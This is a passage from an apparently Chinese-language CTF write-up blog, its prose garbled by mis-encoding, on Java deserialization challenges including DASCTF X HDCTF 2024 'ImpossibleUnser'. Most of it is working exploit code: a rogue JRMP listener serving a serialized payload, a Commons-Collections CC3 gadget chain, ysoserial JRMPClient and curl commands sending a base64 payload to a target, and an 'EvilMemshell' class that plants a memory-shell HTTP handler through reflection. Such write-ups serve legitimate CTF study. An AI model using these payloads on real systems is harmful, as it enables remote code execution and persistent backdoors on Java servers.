s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br>        oos.writeObject(payload);<br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarshalOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">private</span> URL sendUrl;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MarshalOutputStream</span><span class="hljs-params">(OutputStream out, URL u)</span> <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>            <span class="hljs-built_in">this</span>.sendUrl = u;<br>        &#125;<br>        MarshalOutputStream(OutputStream out) <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-built_in">super</span>(out);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.sendUrl != <span class="hljs-literal">null</span>) &#123;<br>                writeObject(<span class="hljs-built_in">this</span>.sendUrl.toString());<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(cl.getClassLoader() <span class="hljs-keyword">instanceof</span> URLClassLoader)) &#123;<br>                writeObject(<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cb</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">for</span> (URL u : us) &#123;<br>                    cb += u.toString();<br>                &#125;<br>                writeObject(cb);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Serializes a location from which to load the specified class.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">annotateProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            annotateClass(cl);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨CC3çš„payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.boogipop.Solutions;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> SerializeUtils.getTemplate();<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//CC1ååŠ</span><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">//éšä¾¿æ”¹æˆä»€ä¹ˆTransformer</span><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazymap,chainedTransformer);<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸€äº›Serializeçš„æ–¹æ³•åŒ…ï¼Œè¿™é‡Œçœç•¥ã€‚</p><p>ç›´æ¥æ‰“ä¸€ä¸ªjaråŒ…ï¼Œæ”¾vpsä¸Šå¼€JRMPClientï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar nocc_exp.jar port<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar JRMPClient vps:port|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:9877/ -d <span class="hljs-string">&quot;rO0AB.....&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927191025308.png" alt="image-20240927191025308"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927191134707.png" alt="image-20240927191134707"></p><h2 id="DASCTF-X-HDCTF-2024-ImpossibleUnser"><a href="#DASCTF-X-HDCTF-2024-ImpossibleUnser" class="headerlink" title="DASCTF X HDCTF 2024 - ImpossibleUnser"></a>DASCTF X HDCTF 2024 - ImpossibleUnser</h2><p>è¿™é“é¢˜æ˜¯ä¸€ä¸ªå¥—çš®é¢˜ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨SpElå†™å…¥jreç„¶åååºåˆ—åŒ–çš„æ“ä½œã€‚è¿™é“ä¹Ÿæ˜¯å½“æ—¶æ‰“å‡ºæ¥æœ€å¤šçš„ã€‚</p><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å®¡è®¡æºç å¯ä»¥å‘ç°æœ‰3ä¸ªè·¯ç”±ï¼Œå…¶ä¸­indexè·¯ç”±ä¼šåˆ—å‡º&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jreç›®å½•æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8000</span>), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/ctf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SPELHandler</span>());<br>        server.createContext(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexHandler</span>());<br>        server.createContext(<span class="hljs-string">&quot;/unser&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnserHandler</span>());<br>        server.setExecutor(<span class="hljs-literal">null</span>);<br>        server.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;indexè®¿é—®ï¼Œä¼šå‘ç°jreä¸‹æœ‰classesç›®å½•ï¼Œç„¶åunserè·¯ç”±å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å…¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-type">InputStream</span> <span class="hljs-variable">requestBody</span> <span class="hljs-operator">=</span> httpExchange.getRequestBody();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> readInputStream(requestBody);<br>       <span class="hljs-keyword">if</span> (!body.equals(<span class="hljs-string">&quot;&quot;</span>))&#123;<br>           Map&lt;String, String&gt; PostData = parseFormData(body);<br>           String payload=PostData.get(<span class="hljs-string">&quot;unser&quot;</span>);<br>           payload= URLDecoder.decode(payload);<br>           <span class="hljs-keyword">try</span> &#123;<br>               base64deserial(payload);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>           &#125;<br>           String response=<span class="hljs-string">&quot;Welcome to My Challenge&quot;</span>;<br>           httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>, response.length());<br>           <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>           os.write(response.getBytes());<br>           os.close();<br>       &#125;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Give me some payload Plz Unser me&quot;</span>;<br>       httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>, response.length());<br>       <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>       os.write(response.getBytes());<br>       os.close();<br>   &#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰ä»»ä½•çš„ä¾èµ–å’Œåˆ©ç”¨é“¾ï¼Œå¹¶ä¸”è¿˜å­˜åœ¨ä¸€ä¸ªSPELæ³¨å…¥çš„å…¥å£ï¼Œä½†æ˜¯åšäº†è¿‡æ»¤ï¼Œæ— æ³•ç›´æ¥rceã€‚</p><p>è¿™é‡Œå°±éœ€è¦é…åˆSPELå»å†™ä¸€ä¸ªæ¶æ„çš„classæ–‡ä»¶åˆ°jre&#x2F;classesç›®å½•ä¸‹ï¼Œæ„é€ çš„æ¶æ„ç±»å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilMemshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, HttpHandler &#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">threadsFeld</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>            threadsFeld.setAccessible(<span class="hljs-literal">true</span>);<br>            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[<span class="hljs-number">1</span>];<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">targetField</span> <span class="hljs-operator">=</span> thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);<br>            targetField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> targetField.get(thread);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">this$0Field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);<br>            <span class="hljs-built_in">this</span>$0Field.setAccessible(<span class="hljs-literal">true</span>);<br>            object = <span class="hljs-built_in">this</span>$0Field.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">contextsField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);<br>            contextsField.setAccessible(<span class="hljs-literal">true</span>);<br>            object = contextsField.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">listField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);<br>            listField.setAccessible(<span class="hljs-literal">true</span>);<br>            java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">linkedList</span> <span class="hljs-operator">=</span> (java.util.LinkedList)listField.get(object);<br>            object = linkedList.get(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            handlerField.set(object,<span class="hljs-built_in">this</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception exception)&#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(base64serial(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilMemshell</span>()));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span 